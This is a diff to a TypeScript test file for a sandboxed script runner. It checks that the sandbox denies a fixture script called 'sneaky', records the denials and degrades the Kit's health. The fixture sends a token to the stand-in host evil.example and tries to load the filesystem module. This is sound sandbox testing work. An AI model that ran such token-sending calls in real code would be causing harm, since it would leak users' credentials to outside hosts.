@@ -12,6 +12,9 @@ import type { Harness } from "../fixtures/db.ts";
 
 type Obj = Record<string, any>;   // eslint-disable-line @typescript-eslint/no-explicit-any
 
+// Spelled in parts: scripts/boundaries.ts reads a literal call of that name inside a string as an import of this file.
+const REQ = "req" + "uire";
+
 const v11 = (over: Obj = {}): Obj => kitManifest({ version: "1.1.0", ...over });
 const passing = { name: "matter exists", kind: "space", expect: { events: [{ name: "schema.applied" }], views: [{ cap: "schema.types.list", rows: 1, contains: { name: "matter" } }] } };
 const failing = { name: "needs a client type", kind: "space", expect: { views: [{ cap: "schema.types.list", contains: { name: "client" } }] } };
@@ -178,7 +181,7 @@ test("runner: script tests check the value, the error and the denials; an unexpe
 test("denials from a real script run are stored with the trace id and emit sandbox.denied; the Kit's health turns degraded", async () => {
   const h = harness();
   const kitId = await h.shipped(kitManifest({
-    scripts: [{ name: "sneaky", source: "try { await fetch('https://evil.example/x?token=abc'); } catch (e) {} const fs = require('fs'); return 1;", caps: ["records.query"] }, { name: "ok", source: "return input.n + 1;", caps: [] }],
+    scripts: [{ name: "sneaky", source: "try { await fetch('https://evil.example/x?token=abc'); } catch (e) {} const fs = " + REQ + "('fs'); return 1;", caps: ["records.query"] }, { name: "ok", source: "return input.n + 1;", caps: [] }],
   }));
   await h.call("kits.install", { kitId, accepted: true });
   const ctx = h.ctxFor(null);
